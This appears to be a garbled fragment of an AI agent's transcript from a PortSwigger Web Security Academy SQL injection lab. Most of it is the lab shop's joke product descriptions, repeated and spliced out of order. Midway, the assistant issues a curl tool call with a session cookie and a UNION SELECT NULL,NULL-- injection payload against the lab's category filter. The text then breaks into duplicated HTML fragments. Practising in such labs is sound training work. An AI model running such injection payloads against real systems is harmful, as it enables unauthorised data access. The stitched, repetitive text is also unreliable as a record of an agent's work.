Get on with everyday tasks as your infant is soothed by the close contact with you at all times.\nWe highly recommend you start as you mean to go on and get the little one used to alternating with the left and right footwear. If you fail to observe this ritual you will find yourself with one overdeveloped calf muscle as you lug the child about.\nPsychologists have endorsed our unique and innovative range of baby minding shoes as they suggest close contact like this from an early age will encourage a strong bond between parent and child in the years ahead.\nKeep those tears and tantrums at bay, and order your first pair today!</td>\n                        </tr>\n                        <tr>\n                            <th>Hologram Stand In</th>\n                            <td>Do you ever have one of those days where nothing looks right, and you just don&apos;t feel like going to the ball?

They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home. Can be housed with other grasshoppers, an older quiet one could help to show it the ropes and understand the rules of the house.</td>\n                        </tr>\n                        <tr>\n                            <th>The Lazy Dog</th>\n                            <td>The Lazy Dog is brought to you by the same people who invented the wheel.

As soon as your pooch has taken its last step of the day just snap the wings into place and click the red &apos;flapping&apos; button on your handheld remote. After a few seconds, your furry friend will be off the ground and up, up and away.\nOnce at a safe height, WARNING: BEWARE OF LOW HANGING BRANCHES, click the blue button to initiate cruise control. The wings have inbuilt cameras so you can see what your dog sees. When clicking the black button your dog can swoop down and gain speed in the &apos;fake chasing rabbits&apos; mode. This function is used at the owner&apos;s risk as it uses a lot of power, and if the battery pack dies a nasty accident could occur.\nCarrying your pooch has become a thing of the past.

Starting with our best seller, the Balloon Ride.\nA large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it&apos;s up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.\nYour dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.\nYou are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover.

Get on with everyday tasks as your infant is soothed by the close contact with you at all times.\nWe highly recommend you start as you mean to go on and get the little one used to alternating with the left and right footwear. If you fail to observe this ritual you will find yourself with one overdeveloped calf muscle as you lug the child about.\nPsychologists have endorsed our unique and innovative range of baby minding shoes as they suggest close contact like this from an early age will encourage a strong bond between parent and child in the years ahead.\nKeep those tears and tantrums at bay, and order your first pair today!</td>\n                        </tr>\n                        <tr>\n                            <th>Hologram Stand In</th>\n                            <td>Do you ever have one of those days where nothing looks right, and you just don&apos;t feel like going to the ball?

They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home. Can be housed with other grasshoppers, an older quiet one could help to show it the ropes and understand the rules of the house.</td>\n                        </tr>\n                        <tr>\n                            <th>The Lazy Dog</th>\n                            <td>The Lazy Dog is brought to you by the same people who invented the wheel.

As soon as your pooch has taken its last step of the day just snap the wings into place and click the red &apos;flapping&apos; button on your handheld remote. After a few seconds, your furry friend will be off the ground and up, up and away.\nOnce at a safe height, WARNING: BEWARE OF LOW HANGING BRANCHES, click the blue button to initiate cruise control. The wings have inbuilt cameras so you can see what your dog sees. When clicking the black button your dog can swoop down and gain speed in the &apos;fake chasing rabbits&apos; mode. This function is used at the owner&apos;s risk as it uses a lot of power, and if the battery pack dies a nasty accident could occur.\nCarrying your pooch has become a thing of the past.

Starting with our best seller, the Balloon Ride.\nA large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it&apos;s up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.\nYour dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.\nYou are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.</td>\n                        </tr>\n                        </tbody>\n                    </table>\n                </div>\n            </section>\n            <div class=\"footer-wrapper\">\n            </div>\n        </div>\n    </body>\n</html>"}, {"role": "assistant", "content": null, "tool_calls": [{"id": "call_7vexjcQLQJH77zI2UTOoHsKM", "type": "function", "function": {"name": "generic_linux_command", "arguments": "{\"command\":\"curl -s -b \\\"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZKtMtK3D0PUxhHoJWVMYXJUjwuRKaUwcEuAx7BSCbscmRl0x%2BZr%2BWCTuUHWieJYmSwtbDajqQw44CiV5co5BUFt0GQyqg1bVlqo1zoPTtIzT1zLiXYlGY6kZ9vMOE%2BX%2FzTzyyySbIYtxpM54CjLnOne; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=890534D67A34EFFD902CFBC2B724CFDA\\\" \\\"https://0a1c00ab04fb6d10811143d300b70040.web-security-academy.net/filter?category=' UNION SELECT NULL,NULL--\\\"\",\"interactive\":false,\"session_id\":\"\"}"}}]}, {"role": "tool", "tool_call_id": "call_7vexjcQLQJH77zI2UTOoHsKM", "content": "Tool response for call_7vexjcQLQJH77zI2UTOoHsKM"}, {"role": "assistant", "content": "I won't repeat the same steps from before.

So, we decided to start designing and manufacturing our unique Pest Control Umbrella, the only genuine umbrella that will do the job. We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.\nNever knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.\nEasy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead. By purchasing this highly effective product you will be well on your way to starting up your own pest control business, a little investment now will pay great dividends in the future for you and your family.</td>\n                        </tr>\n                        <tr>\n                            <th>Giant Grasshopper</th>\n                            <td>If you are one of those anti-social people who like to sit in a corner and try not to catch anyone&apos;s eye, you probably know it doesn&apos;t always work.

This is particularly useful when other pet owners aren&apos;t put off by its peculiarities and insist on chatting &apos;animal&apos; with you.\nThe grasshoppers are surprisingly easy to keep.

Starting with our best seller, the Balloon Ride.\nA large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it&apos;s up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.\nYour dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open.

So, we decided to start designing and manufacturing our unique Pest Control Umbrella, the only genuine umbrella that will do the job. We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.\nNever knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.\nEasy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead.

They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home.

The wings have inbuilt cameras so you can see what your dog sees. When clicking the black button your dog can swoop down and gain speed in the &apos;fake chasing rabbits&apos; mode. This function is used at the owner&apos;s risk as it uses a lot of power, and if the battery pack dies a nasty accident could occur.\nCarrying your pooch has become a thing of the past.

This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.\nYour dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.\nYou are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover.

We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.\nNever knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.\nEasy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead. By purchasing this highly effective product you will be well on your way to starting up your own pest control business, a little investment now will pay great dividends in the future for you and your family.</td>\n                        </tr>\n                        <tr>\n                            <th>Giant Grasshopper</th>\n                            <td>If you are one of those anti-social people who like to sit in a corner and try not to catch anyone&apos;s eye, you probably know it doesn&apos;t always work.

This is particularly useful when other pet owners aren&apos;t put off by its peculiarities and insist on chatting &apos;animal&apos; with you.\nThe grasshoppers are surprisingly easy to keep. They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home.

We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.\nNever knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.\nEasy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead.

They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home.

The wings have inbuilt cameras so you can see what your dog sees. When clicking the black button your dog can swoop down and gain speed in the &apos;fake chasing rabbits&apos; mode. This function is used at the owner&apos;s risk as it uses a lot of power, and if the battery pack dies a nasty accident could occur.\nCarrying your pooch has become a thing of the past.

This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.\nYour dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.\nYou are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover.

We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.\nNever knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.\nEasy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead. By purchasing this highly effective product you will be well on your way to starting up your own pest control business, a little investment now will pay great dividends in the future for you and your family.</td>\n                        </tr>\n                        <tr>\n                            <th>Giant Grasshopper</th>\n                            <td>If you are one of those anti-social people who like to sit in a corner and try not to catch anyone&apos;s eye, you probably know it doesn&apos;t always work.

This is particularly useful when other pet owners aren&apos;t put off by its peculiarities and insist on chatting &apos;animal&apos; with you.\nThe grasshoppers are surprisingly easy to keep. They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home.

So, we decided to start designing and manufacturing our unique Pest Control Umbrella, the only genuine umbrella that will do the job. We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.\nNever knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.\nEasy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead. By purchasing this highly effective product you will be well on your way to starting up your own pest control business, a little investment now will pay great dividends in the future for you and your family.</td>\n                        </tr>\n                        <tr>\n                            <th>Giant Grasshopper</th>\n                            <td>If you are one of those anti-social people who like to sit in a corner and try not to catch anyone&apos;s eye, you probably know it doesn&apos;t always work.

They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home.

The wings have inbuilt cameras so you can see what your dog sees. When clicking the black button your dog can swoop down and gain speed in the &apos;fake chasing rabbits&apos; mode. This function is used at the owner&apos;s risk as it uses a lot of power, and if the battery pack dies a nasty accident could occur.\nCarrying your pooch has become a thing of the past.

This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.\nYour dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.\nYou are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover.

We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.\nNever knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.\nEasy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead. By purchasing this highly effective product you will be well on your way to starting up your own pest control business, a little investment now will pay great dividends in the future for you and your family.</td>\n                        </tr>\n                        <tr>\n                            <th>Giant Grasshopper</th>\n                            <td>If you are one of those anti-social people who like to sit in a corner and try not to catch anyone&apos;s eye, you probably know it doesn&apos;t always work.

This is particularly useful when other pet owners aren&apos;t put off by its peculiarities and insist on chatting &apos;animal&apos; with you.\nThe grasshoppers are surprisingly easy to keep. They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home.

No flies on you, or your takeaway.\nEasy to use, just wait for Mr. Spider to do his daily rounds, shake the can and spray the web. WARNING: Make sure it is completely dry before Mr spider returns, you don&apos;t want him getting stuck and losing a leg in an effort to break free. The solvent has highly tested ingredients that work with the web&apos;s own adhesive qualities in order for it to be a complete working bug catcher.\nBabbage is a very versatile product, if used on low lying webs it will also work as a catcher of mice, rats, and even the odd curious raccoon. And there&apos;s more, if not overused it can even replace your conventional hairspray. WARNING: DO NOT USE ON WET HAIR. The solvent will clump and become permanent.\nFor such a small price you&apos;d be a fool not to give it a try.

So, we decided to start designing and manufacturing our unique Pest Control Umbrella, the only genuine umbrella that will do the job. We have all copyright on these brollies and no other companies are allowed to remotely hint that their umbrellas can be used to rid yourself of those pesky pests.\nNever knowingly undersold we guarantee a price match on any other form of pest control, but not if you use a different umbrella for the job.\nEasy to use, just pop under your arm, pointy end facing behind you and watch the creatures follow your lead. By purchasing this highly effective product you will be well on your way to starting up your own pest control business, a little investment now will pay great dividends in the future for you and your family.</td>\n                        </tr>\n                        <tr>\n                            <th>Giant Grasshopper</th>\n                            <td>If you are one of those anti-social people who like to sit in a corner and try not to catch anyone&apos;s eye, you probably know it doesn&apos;t always work.

This is particularly useful when other pet owners aren&apos;t put off by its peculiarities and insist on chatting &apos;animal&apos; with you.\nThe grasshoppers are surprisingly easy to keep. They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations.
